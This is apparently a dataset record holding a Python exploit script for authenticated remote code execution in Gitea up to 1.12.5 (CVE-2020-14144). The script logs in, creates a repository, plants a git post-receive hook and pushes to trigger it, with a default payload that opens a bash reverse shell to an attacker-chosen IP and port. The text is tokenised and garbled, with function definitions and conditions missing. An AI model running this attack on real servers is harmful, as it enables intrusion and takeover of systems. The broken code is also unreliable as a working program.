{
    "text": "vul_name : Gitea 1.12.5 Remote Code Execution ， vul_cve : CVE-2020-14144 ， vul_poc :  # Exploit Title : Gitea 1.12.5 - Remote Code Execution ( Authenticated )  ，  # Date : 17 Feb 2020 ，  # Exploit Author : Podalirius ，  # PoC demonstration article :  ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : >= 1.1.0 to <= 1.12.5 ，  # Tested on : Ubuntu 16.04 with GiTea 1.6.1 ，  #  ! /usr/bin/env python3 ，  # - * - coding : utf-8 - * - ， requests.packages.urllib3.disable_warnings (  )  ， requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ' : HIGH :  ! DH :  ! aNULL' ， requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ' : HIGH :  ! DH :  ! aNULL' ， pass ， class GiTea ( object )  :  ， super ( GiTea , self ) ._init_ (  )  ， self.verbose = verbose ， self.host = host ， self.username = None ， self.password = None ， self.uid = None ， self.session = None ， pattern = 'name=\"_csrf\" content=\" (  [ a-zA-Z0-9\\-\\_= ] + ) \"' ， csrf = [  ]  ， r = self.session.get ( url )  ， csrf = re.findall ( pattern , r.text )  ， time.sleep ( 1 )  ， csrf = csrf [ 0 ]  ， pattern = 'name=\"_uid\" content=\" (  [ 0-9 ] + ) \"' ， uid = re.findall ( pattern , self.session.get ( url ) .text )  ， time.sleep ( 1 )  ， uid = re.findall ( pattern , self.session.get ( url ) .text )  ， uid = uid [ 0 ]  ， print ( \" [ > ] login ( '%s' , . ) \" % username )  ， self.session = requests.Session (  )  ， r = self.session.get ( '%s/user/login' % self.host )  ， self.username = username ， self.password = password ，  # Logging in ， csrf = self._get_csrf ( self.host )  ， r = self.session.post (  ， '%s/user/login?redirect_to=%2f%s' % ( self.host , self.username )  ,  ， data = {'_csrf' : csrf , 'user_name' : username , 'password' : password} ,  ， allow_redirects=True ，  # Getting User id ， self.uid = self._get_uid ( self.host )  ， print ( \" [ > ] Creating repository : %s\" % repository_name )  ， csrf = self._get_csrf ( self.host )  ，  # Create repo ， r = self.session.post (  ， '%s/repo/create' % self.host ,  ， data = { ， '_csrf' : csrf ,  ， 'uid' : self.uid ,  ， 'repo_name' : repository_name ,  ， 'description' : \"Lorem Ipsum\" ,  ， 'gitignores' : ' ,  ， 'license' : ' ,  ， 'readme' : 'Default' ,  ， 'auto_init' : 'off' ， } ， print ( \" [ > ] Deleting repository : %s\" % repository_name )  ， csrf = self._get_csrf ( '%s/%s/%s/settings' % ( self.host , self.username , repository_name )  ，  # Delete repository ， r = self.session.post (  ， '%s/%s/%s/settings' % ( self.host , self.username , repository_name )  ,  ， data = { ， '_csrf' : csrf ,  ， 'action' : \"delete\" ,  ， 'repo_name' : repository_name ， } ， print ( \" [ > ] repo_set_githook_pre_receive ( '%s' ) \" % repository_name )  ， csrf = self._get_csrf ( '%s/%s/%s/settings/hooks/git/pre-receive' % ( self.host , self.username , repository_name )  ，  # Set pre receive git hook ， r = self.session.post (  ， '%s/%s/%s/settings/hooks/git/pre-receive' % ( self.host , self.username , repository_name )  ,  ， data = { ， '_csrf' : csrf ,  ， 'content' : content ， } ， print ( \" [ > ] repo_set_githook_update ( '%s' ) \" % repository_name )  ， csrf = self._get_csrf ( '%s/%s/%s/settings/hooks/git/update' % ( self.host , self.username , repository_name )  ，  # Set update git hook ， r = self.session.post (  ， '%s/%s/%s/settings/hooks/git/update' % ( self.host , self.username , repository_name )  ,  ， data = { ， '_csrf' : csrf ,  ， 'content' : content ， } ， print ( \" [ > ] repo_set_githook_post_receive ( '%s' ) \" % repository_name )  ， csrf = self._get_csrf ( '%s/%s/%s/settings/hooks/git/post-receive' % ( self.host , self.username , repository_name )  ，  # Set post receive git hook ， r = self.session.post (  ， '%s/%s/%s/settings/hooks/git/post-receive' % ( self.host , self.username , repository_name )  ,  ， data = { ， '_csrf' : csrf ,  ， 'content' : content ， } ， print ( \" [ > ] logout (  ) \" )  ，  # Logging out ， r = self.session.get ( '%s/user/logout' % self.host )  ，  # Create a temporary directory ， tmpdir = os.popen ( 'mktemp -d' ) .read (  ) .strip (  )  ， os.chdir ( tmpdir )  ，  # We create some files in the repository ， os.system ( 'touch README.md' )  ， rndstring = '.join (  [ hex ( random.randint ( 0 , 15 )  [ 2 :  ] for k in range ( 32 )  ]  )  ， os.system ( 'echo \"%s\" README.md' % rndstring )  ， os.system ( 'git init' )  ， os.system ( 'git add README.md' )  ， os.system ( 'git commit -m \"Initial commit\"' )  ，  # Connect to remote source repository ， os.system ( 'git remote add origin %s/%s/%s.git' % ( host , username , repository_name )  ，  # Push the files ( it will trigger post-receive git hook )  ， conn = pexpect.spawn ( \"/bin/bash -c 'cd %s git push -u origin master'\" % tmpdir )  ， conn.expect ( \"Username for . *  : \" )  ， conn.sendline ( username )  ， conn.expect ( \"Password for . *  : \" )  ， conn.sendline ( password )  ， conn.expect ( \"Total. * \" )  ， print ( conn.before.decode ( 'utf-8' ) .strip (  )  ， print ( \" _ _ _ ， / _ ( _ ) _ _ | CVE-2020-14144 ，  |  | _ _ |  | _ _ _ ，  |  |  | _ |  |  |  | / _ \\/ _` | Authenticated Remote Code Execution ，  |  | _ |  |  |  |  | _/ ( _ |  |  ， \\_ | _ |  | _ | \\_ | \\_ , _ | GiTea versions >= 1.1.0 to <= 1.12.5 ， \" )  ， header (  )  ， parser = argparse.ArgumentParser ( description='Process some integers.' )  ， parser.add_argument ( '-v' , '-verbose' , required=False , default=False , action='store_true' , help='Increase verbosity.' )  ， parser.add_argument ( '-t' , '-target' , required=True , type=str , help='Target host ( or domain name ) ' )  ， parser.add_argument ( '-u' , '-username' , required=True , type=str , default=None , help='GiTea username' )  ， parser.add_argument ( '-p' , '-password' , required=True , type=str , default=None , help='GiTea password' )  ， parser.add_argument ( '-I' , '-rev-ip' , required=False , type=str , default=None , help='Reverse shell listener IP' )  ， parser.add_argument ( '-P' , '-rev-port' , required=False , type=int , default=None , help='Reverse shell listener port' )  ， parser.add_argument ( '-f' , '-payload-file' , required=False , default=None , help='Path to shell script payload to use.' )  ， args = parser.parse_args (  )  ， print ( ' [  !  ] Either ( -I REV_IP and -P REV_PORT ) or ( -f PAYLOAD_FILE ) options are needed' )  ， sys.exit ( -1 )  ，  # Read specific payload file ， f = open ( args.payload_file , 'r' )  ， hook_payload = '.join ( f.readlines (  )  ， f.close (  )  ， hook_payload = \" #  ! /bin/bash\\nbash -i >& /dev/tcp/%s/%d 0>&1 &\\n\" % ( args.rev_ip , args.rev_port )  ， pass ， elif args.target.startswith ( ' ， pass ， args.target = ' + args.target ， print ( ' [ + ] Starting exploit .' )  ， g = GiTea ( args.target , verbose=args.verbose )  ， reponame = 'vuln' ， g.repo_delete ( reponame )  ， g.repo_create ( reponame )  ， g.repo_set_githook_post_receive ( reponame , hook_payload )  ， g.logout (  )  ， trigger_exploit ( g.host , g.username , g.password , reponame , verbose=args.verbose )  ， g.repo_delete ( reponame )  ， print ( '\\x1b [ 1 ; 91m [  !  ] \\x1b [ 0m Could not login with these credentials.' )  ， print ( ' [ + ] Exploit completed ! ' ) ",
    "time": "2021.02.19"
}